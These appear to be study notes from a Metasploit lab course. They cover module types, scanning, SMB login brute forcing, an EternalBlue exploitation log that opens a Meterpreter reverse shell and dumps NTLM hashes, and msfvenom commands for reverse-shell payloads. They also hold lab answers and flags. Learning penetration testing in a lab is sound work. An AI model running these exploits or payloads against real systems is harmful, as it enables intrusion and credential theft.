# Introduction to Metasploit
```bash
msfconsole 
```
-to launch Metasploit

Exploit: A piece of code that uses a vulnerability present on the target system.

Vulnerability: A design, coding, or logic flaw affecting the target system. The exploitation of a vulnerability can result in disclosing confidential information or allowing the attacker to execute code on the target system.

Payload: An exploit will take advantage of a vulnerability. However, if we want the exploit to have the result we want (gaining access to the target system, read confidential information, etc.), we need to use a payload. Payloads are the code that will run on the target system.

### Auxilary
Any supporting module, such as scanners, crawlers and fuzzers, can be found here.

```bash
show auxiliary
```


### Encoders
Encoders will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.

```bash
show encoders
```


### Evasion
While encoders will encode the payload, they should not be considered a direct attempt to evade antivirus software. On the other hand, “evasion” modules will try that, with more or less success.

```bash
show evasion
```


### Exploits
Exploits, neatly organized by target system.

```bash
show exploits
```


### NOPs
NOPs (No OPeration) do nothing, literally. They are represented in the Intel x86 CPU family with 0x90, following which the CPU will do nothing for one cycle. They are often used as a buffer to achieve consistent payload sizes.

```bash
show nops
```

### Payloads
Payloads are codes that will run on the target system.

```bash
show payloads
```

Four different directories under payloads: adapters, singles, stagers and stages.

Adapters: An adapter wraps single payloads to convert them into different formats. For example, a normal single payload can be wrapped inside a Powershell adapter, which will make a single powershell command that will execute the payload.

Singles: Self-contained payloads (add user, launch notepad.exe, etc.) that do not need to download an additional component to run.

Stagers: Responsible for setting up a connection channel between Metasploit and the target system. Useful when working with staged payloads. “Staged payloads” will first upload a stager on the target system then download the rest of the payload (stage). This provides some advantages as the initial size of the payload will be relatively small compared to the full payload sent at once.

Stages: Downloaded by the stager. This will allow you to use larger sized payloads.

Metasploit has a subtle way to help you identify single (also called “inline”) payloads and staged payloads.

generic/shell_reverse_tcp
windows/x64/shell/reverse_tcp
Both are reverse Windows shells. The former is an inline (or single) payload, as indicated by the “_” between “shell” and “reverse”. While the latter is a staged payload, as indicated by the “/” between “shell” and “reverse”.

### Post
Post modules will be useful on the final stage of the penetration testing process listed above, post-exploitation.

```bash
show post
```

### Q&A
What is the name of the code taking advantage of a flaw on the target system?
Exploit

What is the name of the code that runs on the target system to achieve the attacker's goal?
Payload

What are self-contained payloads called?
Singles

Is "windows/x64/pingback_reverse_tcp" among singles or staged payload?
Singles


### " use " 
```bash
use exploit/windows/smb/ms17_010_eternalblue
```
 command, you will see the command line prompt change from msf6 to “msf6 exploit(windows/smb/ms17_010_eternalblue)”. The "EternalBlue" is an exploit allegedly developed by the U.S. National Security Agency (N.S.A.) for a vulnerability affecting the SMBv1 server on numerous Windows systems. 

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > info

       Name: MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
     Module: exploit/windows/smb/ms17_010_eternalblue
   Platform: Windows
       Arch: x64
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Average
  Disclosed: 2017-03-14
```

 can use the  info command followed by the module’s path from the msfconsole prompt.

 

One of the most useful commands in msfconsole is search. This command will search the Metasploit Framework database for modules relevant to the given search parameter. 

Source: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking
```bash
msf6 > search type:auxiliary telnet
```
search results 

### Q&A
How would you search for a module related to Apache?
search apache

Who provided the auxiliary/scanner/ssh/ssh_login module?
todb

### Working with modules

Set or unset  parameter

```bash
set rhosts 10.10.165.39
```

```bash
unset rhosts 10.10.165.39
```

```bash
unset all
```
The setg command sets a global value that will be used until you exit Metasploit or clear it using the unsetg command.
### Using modules

The exploit command can be used without any parameters or using the “-z” parameter.

The exploit -z command will run the exploit and background the session as soon as it opens.
```bash
sf6 > use exploit/windows/smb/ms17_010_eternalblue 
```

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit -z
```
## Sessions

You can use the " background " command to background the session prompt and go back to the msfconsole prompt.
```bash
meterpreter > background
```
The sessions command can be used from the msfconsole prompt or any context to see the existing sessions.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
```
To interact with any session, you can use the " sessions -i "command followed by the desired session number.

### Q&A
How would you set the LPORT value to 6666?
set LPORT 6666

How would you set the global value for RHOSTS  to 10.10.19.23 ?
setg RHOSTS 10.10.19.23

What command would you use to clear a set payload?
unset PAYLOAD

What command do you use to proceed with the exploitation phase?
exploit

# Metasploit: Exploitation
## Scanning

###Port Scanning
Metasploit has a number of modules to scan open ports on the target system and network. You can list potential port scanning modules available using the search portscan command.

 ```bash
msf6 > search portscan
```
Port scanning modules will require you to set a few options:
```bash
msf6 auxiliary(scanner/portscan/tcp) > show options

Module options (auxiliary/scanner/portscan/tcp):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   DELAY        0                yes       The delay between connections, per thread, in milliseconds
   JITTER       0                yes       The delay jitter factor (maximum value by which to +/- DELAY) in milliseconds.
   PORTS        1-10000          yes       Ports to scan (e.g. 22-25,80,110-900)
   RHOSTS                        yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:'
   THREADS      1                yes       The number of concurrent threads (max one per host)
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf6 auxiliary(scanner/portscan/tcp) >
```
CONCURRENCY: Number of targets to be scanned simultaneously.
PORTS: Port range to be scanned. Please note that 1-1000 here will not be the same as using Nmap with the default configuration. Nmap will scan the 1000 most used ports, while Metasploit will scan port numbers from 1 to 10000.
RHOSTS: Target or target network to be scanned.
THREADS: Number of threads that will be used simultaneously. More threads will result in faster scans.

You can directly perform Nmap scans from the msfconsole prompt as shown below faster:
```bash
msf6 > nmap -sS 10.10.12.229
```
### UDP service Identification
The scanner/discovery/udp_sweep module will allow you to quickly identify services running over the UDP (User Datagram Protocol). As you can see below, this module will not conduct an extensive scan of all possible UDP services but does provide a quick way to identify services such as DNS or NetBIOS.
```bash
msf6 auxiliary(scanner/discovery/udp_sweep) > run
```

### SMB Scans
Metasploit offers several useful auxiliary modules that allow us to scan specific services. Below is an example for the SMB. Especially useful in a corporate network would be smb_enumshares and smb_version but please spend some time to identify scanners that the Metasploit version installed on your system offers.
```bash
msf6 auxiliary(scanner/smb/smb_version) > run
```

When scanning services, don’t overlook less common ones like NetBIOS, which can reveal system roles (e.g., CORP-DC, DEVOPS) and sometimes expose shared files or folders with weak/no passwords. Metasploit offers many modules to gather more information and identify vulnerabilities, so it’s useful to search for relevant ones during assessments.

### Q&A

How many ports are open on the target system?5
```bash
nmap sS (ip address)
```

Using the relevant scanner, what NetBIOS name can you see?ACME IT SUPPORT
```bash
use auxiliary/scanner/http/http_version
show options
set RHOSTS (ip address)
run
```

What is running on port 8000?webfs/1.21
```bash
use auxiliary/scanner/http/http_version
show options
set RHOSTS 10.10.10.5
run
```

What is the "penny" user's SMB password? Use the wordlist mentioned in the previous task.leo1234
```bash
use auxiliary/scanner/smb/smb_login
set RHOSTS 10.10.48.113
set SMBUser penny
set PASS_FILE /usr/share/wordlists/MetasploitRoom/MetasploitWordlist.txt 
run
```
## The Metasploit Database

Start PostgreSQL:
**systemctl start postgresql**

Initialize the Metasploit database:
**msfdb init**

Running as root shows: “Please run msfdb as a non-root user.”
Fix:
**sudo -u postgres msfdb init**

(Optional) If you want to redo setup, delete the existing database first:
**sudo -u postgres msfdb delete**

# Metasploit Quick Reference Table

| Task / Command                  | Description |
|---------------------------------|------------|
| `msfconsole`                     | Launch Metasploit |
| `db_status`                      | Check database connection |
| `workspace`                      | List workspaces |
| `workspace -a <name>`            | Add new workspace |
| `workspace <name>`               | Switch workspace |
| `workspace -d <name>`            | Delete workspace |
| `hosts`                           | List all hosts in DB |
| `services`                        | List all services |
| `services -S <name>`              | Filter services (e.g., netbios) |
| `vulns`                            | List vulnerabilities |
| `db_nmap -sV -p- <IP>`            | Nmap scan, save results to DB |
| `hosts -R`                         | Assign RHOSTS from saved hosts |
| `use auxiliary/scanner/smb/smb_ms17_010` | Scan for MS17-010 vuln |
| `show options`                     | Show module options |
| `run`                              | Execute module/exploit |

**Tips:**
- Use **workspaces** to isolate projects.
- Use **db_nmap** to save scan results automatically.
- Focus on **HTTP, FTP, SMB, SSH, RDP** for common vulnerabilities.

## Vulnerability Scanning
```bash
use auxiliary/scanner/vnc/vnc_login
info
```
Who wrote the module that allows us to check SMTP servers for open relay?Campbell Murray

```bash
search type:auxiliary smtp open
use auxiliary/scanner/smtp/smtp_relay 
info
```
## Eploitation


- **search <keyword>** → Find exploits  
- **info** → Get details about an exploit  
- **exploit** (or **run**) → Launch exploit  

Most exploits have a default payload, but you can list others with:  
- **show payloads**

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads
```
Once you have decided on the payload, you can use the set payload command to make your choice.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload 2
```

Some payloads will open new parameters that you may need to set, running the **show options** command once more can show these. As you can see in the above example, a reverse payload will at least require you to set the **LHOST** option.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set lhost 10.10.186.44
```


Once a session is opened, you can background it using **CTRL+Z** or abort it using **CTRL+C**. Backgrounding a session will be useful when working on more than one target simultaneously or on the same target with a different exploit and/or shell.

```bash
C:\Windows\system32>^Z
Background session 1? [y/N]  y
```
** Working with sessions**
he sessions command will list all active sessions. The sessions command supports a number of options that will help you manage sessions better.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions -h
```

You can interact with any existing session using the **sessions -i** command followed by the session ID.

```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > sessions
```

## Q&A
Exploit one of the critical vulnerabilities on the target VM
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.201.90.115
RHOSTS => 10.201.90.115
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.201.100.126
LHOST => 10.201.100.126
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.201.100.126:4444 
[*] 10.201.90.115:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[-] 10.201.90.115:445     - An SMB Login Error occurred while connecting to the IPC$ tree.
[*] 10.201.90.115:445     - Scanned 1 of 1 hosts (100% complete)
[-] 10.201.90.115:445 - The target is not vulnerable.
[*] Exploit completed, but no session was created.
```

What is the content of the flag.txt file?
THM-5455554845
```bash
msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.201.114.103
RHOST => 10.201.114.103
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 10.201.100.126
LHOST => 10.201.100.126
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
[*] Started reverse TCP handler on 10.201.100.126:4444 
[*] 10.201.114.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.201.114.103:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 10.201.114.103:445    - Scanned 1 of 1 hosts (100% complete)
[+] 10.201.114.103:445 - The target is vulnerable.
[*] 10.201.114.103:445 - Connecting to target for exploitation.
[+] 10.201.114.103:445 - Connection established for exploitation.
[+] 10.201.114.103:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.201.114.103:445 - CORE raw buffer dump (42 bytes)
[*] 10.201.114.103:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.201.114.103:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.201.114.103:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.201.114.103:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.201.114.103:445 - Trying exploit with 12 Groom Allocations.
[*] 10.201.114.103:445 - Sending all but last fragment of exploit packet
[*] 10.201.114.103:445 - Starting non-paged pool grooming
[+] 10.201.114.103:445 - Sending SMBv2 buffers
[+] 10.201.114.103:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.201.114.103:445 - Sending final SMBv2 buffers.
[*] 10.201.114.103:445 - Sending last fragment of exploit packet!
[*] 10.201.114.103:445 - Receiving response from exploit packet
[+] 10.201.114.103:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.201.114.103:445 - Sending egg to corrupted connection.
[*] 10.201.114.103:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 10.201.114.103
[*] Meterpreter session 1 opened (10.201.100.126:4444 -> 10.201.114.103:49178) at 2025-08-24 16:50:17 +0100
[+] 10.201.114.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.201.114.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.201.114.103:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=


meterpreter > search -f flag.txt
Found 1 result...
=================

Path                             Size (bytes)  Modified (UTC)
----                             ------------  --------------
c:\Users\Jon\Documents\flag.txt  15            2021-07-15 03:39:25 +0100

meterpreter > cd c:\Users\Jon\Documents
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd Users
[-] stdapi_fs_chdir: Operation failed: The system cannot find the file specified.
meterpreter > cd C:\\Users\\Jon\\Documents
meterpreter > ls
Listing: C:\Users\Jon\Documents
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Music
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Pictures
040777/rwxrwxrwx  0     dir   2018-12-13 03:13:31 +0000  My Videos
100666/rw-rw-rw-  402   fil   2018-12-13 03:13:48 +0000  desktop.ini
100666/rw-rw-rw-  15    fil   2021-07-15 03:39:25 +0100  flag.txt

meterpreter > cat flag.txt
THM-5455554845
```

What is the NTLM hash of the password of the user "pirate"?8ce9a3ebd1647fcc5e04025019f4b875
```bash
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/smb/ms17_010_eternalblue) > use post/windows/gather/hashdump
msf6 post(windows/gather/hashdump) > sessions -l

Active sessions
===============

  Id  Name  Type                     Information                   Connection
  --  ----  ----                     -----------                   ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.201.100.126:4444 -> 10.201.114.103:49178 (10
                                                                   .201.114.103)

msf6 post(windows/gather/hashdump) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/hashdump) > run
[*] Obtaining the boot key...
[*] Calculating the hboot key using SYSKEY 55bd17830e678f18a3110daf2c17d4c7...
[*] Obtaining the user list and keys...
[*] Decrypting user keys...
[*] Dumping password hints...

No users with password hints on this system

[*] Dumping password hashes...


Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
pirate:1001:aad3b435b51404eeaad3b435b51404ee:8ce9a3ebd1647fcc5e04025019f4b875:::


[*] Post module execution completed
```

## msfvenom
```bash
root@ip-10-10-186-44:~# msfvenom -l payloads 

Framework Payloads (562 total) [--payload ]
==================================================
```

**Output formats**
You can either generate stand-alone payloads (e.g. a Windows executable for Meterpreter) or get a usable raw format (e.g. python). Themsfvenom --list formats command can be used to list supported output formats

**Encoders**
Contrary to some beliefs, encoders do not aim to bypass antivirus installed on the target system. As the name suggests, they encode the payload. While it can be effective against some antivirus software, using modern obfuscation techniques or learning methods to inject shellcode is a better solution to the problem. The example below shows the usage of encoding (with the **-e** parameter. The PHP version of Meterpreter was encoded in Base64, and the output format was **raw**.
```bash
root@ip-10-10-186-44:~# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64
```

**Handlers**


Similar to exploits using a reverse shell, you will need to be able to accept incoming connections generated by the MSFvenom payload. When using an exploit module, this part is automatically handled by the exploit module, you will remember how the payload options title appeared when setting a reverse shell. The term commonly used to receive a connection from a target is 'catching a shell'. Reverse shells or Meterpreter callbacks generated in your MSFvenom payload can be easily caught using a handler.

The following scenario may be familiar; we will exploit the file upload vulnerability present in DVWA (Damn Vulnerable Web Application). For the exercises in this task, you will need to replicate a similar scenario on another target system, DVWA was used here for illustration purposes. The exploit steps are;

Generate the PHP shell using MSFvenom
Start the Metasploit handler
Execute the PHP shell
MSFvenom will require a payload, the local machine IP address, and the local port to which the payload will connect. Seen below, 10.0.2.19 is the IP address of the AttackBox used in the attack and local port 7777 was chosen.

```bash
root@ip-10-0-2-19:~# msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
```
Linux Executable and Linkable Format (elf)
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf
The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the chmod +x shell.elf command to accord executable permissions. Once done, you can run this file by typing ./shell.elf on the target machine command line.

Windows
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe
```
PHP
```bash
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php
```
ASP
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp
```
Python
```bash
msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py
```








